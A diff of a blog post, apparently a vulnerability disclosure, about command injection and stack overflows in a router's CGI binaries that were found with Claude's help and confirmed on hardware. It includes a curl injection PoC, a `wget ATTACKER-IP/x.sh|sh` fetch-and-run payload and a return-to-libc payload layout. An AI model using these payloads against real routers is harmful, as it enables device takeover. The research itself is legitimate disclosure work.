@@ -162,12 +162,13 @@ The sink is gated behind `reboot_enabled=1`. Without that parameter the sink is 
 
 The PoC, also looks similar to Findings 1 and 2:
 ```bash
-curl -s -X POST http://TARGET-IP/cgi-bin/adm.cgi -d "page=reboot_time&reboot_enabled=1&reboot_time=10:00;ping -c 7 ATTACKER-IP"
+curl -s -X POST http://TARGET-IP/cgi-bin/adm.cgi \
+-d "page=reboot_time&reboot_enabled=1&reboot_time=10:00;ping -c 7 ATTACKER-IP"
 ```
 
 Claude found it, I confirmed it on the actual hardware. The experiment was working!
 
-As a bonus in this case, since it's again adm.cgi, the output gets weirdly reflected in the HTTP response. Much like page=sysCMD of CVE-2026-30703. Why this happens is still beyond me, though I stand by my theories of the original post, but gives a nicer way of seeing the command output, as can be seen here:
+As a bonus in this case, since it's again adm.cgi, the output gets weirdly reflected in the HTTP response. Much like page=sysCMD of CVE-2026-30703. Why this happens is still beyond me, though I stand by my theories of the original post. Anyhow, it gives a nicer way of seeing the command output, as can be seen here:
 
 <div align="center">
     <img src="/assets/images/teaching_the_machine_where_to_look/command-injection-adm-cgi-reboot-time.png" style="width:80%;">
@@ -175,7 +176,7 @@ As a bonus in this case, since it's again adm.cgi, the output gets weirdly refle
 
 Assigned CVE: CVE-2026-41925 **OS Command Injection in adm.cgi**
 
-## Finding 4 aka the non-standard dispatch: makeRequest.cgi
+### Finding 4 aka the non-standard dispatch: makeRequest.cgi
 
 What about "non standard" requests? Or something that diverges from the pattern I told Claude?
 
@@ -211,11 +212,11 @@ One small nuance: `get_nth_value` caps the extracted token at 31 bytes (`max_siz
 set_time&2024;wget ATTACKER-IP/x.sh|sh
 ```
 
-This took a bit of back and forth. Claude initially found the sink by looking for the usual pattern, but disregarded it because of the limited payload length, and for the "strange" request body. Upon manual investigation, by look at the actual HTTP requests, I simply instructed Claude about the body parameters structure. It then adapted its pattern and caught this vulnerability as well.
+This took a bit of back and forth. Claude initially found the sink by looking for the usual pattern, but disregarded it because of the limited payload length, and for the "strange" request body. Upon manual investigation, by looking at the actual HTTP requests, I simply instructed Claude about the body parameters structure. It then adapted its pattern and caught this vulnerability as well.
 
 Assigned CVE: CVE-2026-41924 **OS Command Injection in makeRequest.cgi**
 
-## Finding 5 aka the surprise: firewall.cgi dispatches on a different key
+### Finding 5 aka the surprise: firewall.cgi dispatches on a different key
 
 Now let’s put everything together: non standard web dispatches and some sort of sanitization. 
 
@@ -303,7 +304,7 @@ To clean up after testing, one needs to send a follow-up request with an empty v
 
 Assigned CVE: CVE-2026-41926 **OS Command Injection in firewall.cgi**
 
-## Validation on hardware
+### Validation on hardware
 
 Now, enough for the theory and let's see some PoCs in practice. I will show only a subset of the PoCs, as most payloads are duplicates, but rest assured that all exploits were validated against the hardware. 
 
@@ -435,7 +436,9 @@ size=560-700:  HTTP/1.1 200 OK          ← stack smashed
 [...]
 ```
 
-The transition at **byte 556** is precisely the RA offset the static analysis predicted. The 302 → 200 (empty) behavior has an elegant explanation:
+The transition at **byte 556** is precisely the RA offset the static analysis predicted. 
+
+The 302 → 200 (empty) behavior has an elegant explanation:
 
 1. `web_redirect()` has already written `Status: 302\nLocation: ...\n` into the process's stdio buffer (block-buffered, 4 KB).
 2. The handler falls through to `LAB_004013a8` → `nvram_close(0)` → `return 0`.
@@ -445,7 +448,7 @@ The transition at **byte 556** is precisely the RA offset the static analysis pr
 
 So the "HTTP 200" response is, paradoxically, evidence of a crash: if the CGI had returned normally, it would have flushed its buffered 302.
 
-## Proving $ra is attacker-controlled
+### Proving $ra is attacker-controlled
 
 The sweep establishes that byte 556 is special, but to claim full control of `$ra` we need direct kernel-level evidence. MIPS Linux will print a register dump on SIGSEGV if `print-fatal-signals` is enabled.
 
@@ -476,7 +479,7 @@ Reading this output:
 - `epc : 0xcafebabe` - Exception PC, i.e. the address the CPU was trying to fetch when the MMU failed. It equals the value the attacker injected into the RA slot, byte-for-byte.
 - `BadVA : cafebabe` - the faulting virtual address.
 
-## Attempting weaponization - return-to-libc
+### Attempting weaponization - return-to-libc
 
 With `$ra` under control, the next step is a classic MIPS return-to-libc. uClibc 0.9.33.2 at offset `0x3a4e8` contains a textbook gadget found by Daniele thanks to his expertise in exploit development:
 
@@ -514,7 +517,7 @@ The payload layout, byte by byte:
 | 584–608 | shell command, e.g. `ping -c 7 ATTACKER-IP` |
 | 609 | NUL terminator |
 
-## Why the RCE is fragile: libc base varies per process
+### Why the RCE is fragile: libc base varies per process
 
 Theory: clean. Practice: less so.
 
